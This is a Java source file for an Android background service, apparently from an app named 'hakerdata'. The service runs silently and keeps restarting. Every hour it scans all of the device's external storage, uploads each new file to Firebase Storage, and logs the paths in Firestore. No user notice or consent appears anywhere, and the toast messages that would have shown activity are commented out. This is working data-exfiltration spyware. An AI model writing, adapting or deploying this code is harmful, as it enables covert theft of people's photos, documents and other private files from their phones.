package com.example.hakerdata;

import android.app.ProgressDialog;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.QueryDocumentSnapshot;
import com.google.firebase.firestore.QuerySnapshot;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class BackService extends Service {

    private Handler handler;
    private Runnable runnable;
    private final int runTime = 3600000;
    private int num = 0;

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();
    Uri filePath;
    String fileList = "";
    List<String> filePaths = new ArrayList<>();
    List<String> fileLists = new ArrayList<>();
    FirebaseFirestore db = FirebaseFirestore.getInstance();
    int showIndex = 0;
    boolean isStart = false;

    public BackService() {
    }

    public void init()
    {
        getListFiles(new File(Environment.getExternalStorageDirectory().toString()));
        readDatafromFirebase();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void onCreate() {
        // Toast.makeText(this, "The new Service was Created", Toast.LENGTH_LONG).show();
        handler = new Handler();
        runnable = new Runnable() {
            @Override
            public void run() {
                init();
                handler.postDelayed(runnable, runTime);
                // Toast.makeText(getApplicationContext(), String.valueOf(num++), Toast.LENGTH_SHORT).show();
            }
        };
        handler.post(runnable);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        // Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
        if (handler != null) {
            handler.removeCallbacks(runnable);
        }
    }

    public void getListFiles(File parentDir) {

        File[] files = parentDir.listFiles();
        if(files != null)
            for (File file : files) {
                if(file != null)
                    if (file.isFile()) {
                        fileList += file.getAbsolutePath() + "\n";
                        filePaths.add(file.getAbsolutePath());
                    } else {
                        getListFiles(file);
                    }
            }
    }

    private void uploadImage(String path) {
        if (path != null) {
            File file = new File(path);
            if (!file.exists()) return;

            Uri urifile = Uri.fromFile(new File(path));

            StorageReference ref = storageRef.child(path);

            ref.getMetadata().addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    showIndex ++;
                    ref.putFile(urifile).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot){
                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            // Toast.makeText(getBaseContext(), "Failed " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
                }
            });
        }
    }

    public void readDatafromFirebase() {
        db.collection("files")
                .get()
                .addOnCompleteListener(new OnCompleteListener<QuerySnapshot>() {
                    @Override
                    public void onComplete(@NonNull Task<QuerySnapshot> task) {
                        if (task.isSuccessful()) {
                            fileList = "";
                            for (QueryDocumentSnapshot document : task.getResult()) {
                                fileLists.add(document.get("path").toString());

                                for (int i = 0; i < filePaths.size(); i++)
                                    if(filePaths.get(i).equals(document.get("path").toString()))
                                    {
                                        filePaths.remove(i);
                                        break;
                                    }
                            }

                            for(int i = 0 ; i < filePaths.size(); i++)
                                uploadImage(filePaths.get(i));
//                            // Toast.makeText(getApplicationContext(),
//                                    String.valueOf("Uplodable file number is "
//                                            + filePaths.size() + "---" + showIndex),
//                                    Toast.LENGTH_SHORT).show();
                            showIndex = 0;

                            saveData2Firebase();
                        } else {
                            Log.w("TAG:", "Error getting documents.", task.getException());
                        }
                    }
                });
    }

    public void saveData2Firebase() {

        for(int i = 0; i < filePaths.size(); i++) {
            Map<String, Object> user = new HashMap<>();
            user.put("path", filePaths.get(i));
            String documentref = filePaths.get(i).replace("/", "_");

            // Add a new document with a generated ID
            db.collection("files").document(documentref).set(user)
                    .addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void aVoid) {
                            Log.d("TAG", "DocumentSnapshot successfully written!");
                        }
                    })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Log.w("TAG", "Error writing document", e);
                        }
                    });
        }
    }
}